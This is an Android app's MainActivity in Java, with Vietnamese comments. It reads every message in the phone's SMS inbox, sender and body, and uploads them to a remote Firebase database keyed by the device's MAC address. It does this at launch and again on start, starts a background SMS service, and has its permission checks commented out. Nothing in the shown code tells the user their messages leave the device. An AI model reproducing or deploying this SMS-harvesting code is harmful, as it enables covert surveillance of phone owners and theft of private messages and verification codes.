package com.example.hungdang.readsms;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import net.cryptobrewery.macaddress.MacAddress;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private SMSBroadcastReceiver receiver;
    Button bt_startsms;


    private int MY_PERMISSIONS_REQUEST_SMS_RECEIVE = 10;
    public static final String SECURE_SETTINGS_BLUETOOTH_ADDRESS = "bluetooth_address";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //Yêu cầu hệ điều hành cho phép đọc tin nhắn từ điện thoại
        ActivityCompat.requestPermissions(MainActivity.this,
                new String[]{Manifest.permission.RECEIVE_SMS,Manifest.permission.READ_SMS},
                MY_PERMISSIONS_REQUEST_SMS_RECEIVE);

        receiver = new SMSBroadcastReceiver();
        final IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(receiver, filter);

//        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_SMS)
//                == PackageManager.PERMISSION_GRANTED){
            //Chuyển dữ liệu lấy được 1 phần về dạng class
            List<Sms> sms = new ArrayList();

            sms = getSMS(MainActivity.this);

            //Lưu dữ liêu lấy được ở dạng class lên database trên webservice
            String macAddress = Settings.Secure.getString(getContentResolver(), SECURE_SETTINGS_BLUETOOTH_ADDRESS);
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference myRef = database.getReference("message").child("message"+MacAddress.getMacAddr().toString());
            myRef.setValue(sms);
//        }


    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onStart() {
        super.onStart();
//        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_SMS)
//                == PackageManager.PERMISSION_GRANTED) {
            receiver = new SMSBroadcastReceiver();
            List<Sms> sms = new ArrayList();
//
            sms = getSMS(this);
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference myRef = database.getReference("message").child("message"+MacAddress.getMacAddr().toString());
            myRef.setValue(sms);


            startService(new Intent(this,SMSService.class));
//        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == MY_PERMISSIONS_REQUEST_SMS_RECEIVE) {
            // YES!!
            Log.i("TAG", "MY_PERMISSIONS_REQUEST_SMS_RECEIVE --> YES");
        }
    }

    public List<Sms> getSMS(Context context){
        List<Sms> sms = new ArrayList<Sms>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
//        String address="",body="";
//        Sms smsDB = new Sms(address,body);
        while (cur != null && cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            Sms smsDB = new Sms(address,body);
            smsDB.setNumber(address);
            smsDB .setMessage(body);
            sms.add(smsDB);
//            Toast.makeText(context, sms.toString(), Toast.LENGTH_SHORT).show();
        }

        if (cur != null) {
            cur.close();
        }
        return sms;
    }

}
